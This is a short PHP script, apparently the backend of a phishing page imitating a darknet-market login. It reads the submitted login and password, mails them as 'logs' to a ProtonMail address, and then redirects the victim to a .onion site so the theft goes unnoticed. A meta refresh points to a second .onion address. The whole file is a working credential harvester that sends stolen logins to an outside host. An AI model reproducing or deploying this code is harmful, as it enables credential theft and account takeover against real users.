<?php

    $mess ="Login: ".$_POST['login']."\n"."Password: ".$_POST['password'];
    
    mail("gbhk2025@protonmail.com", "logs", $mess); 
    
header("Location: http://megacatkp55k5rtmloe3da7k7w7hp5l2da2kkmbc7lqdlm442wrxrqyd.onion/"); 
?>
<html><head><META HTTP-EQUIV='Refresh' content ='0; http://megadmeovbj6ahqw3reuqu5gbg4meixha2js2in3ukymwkwjqqib6tqd.onion'></head></html> 



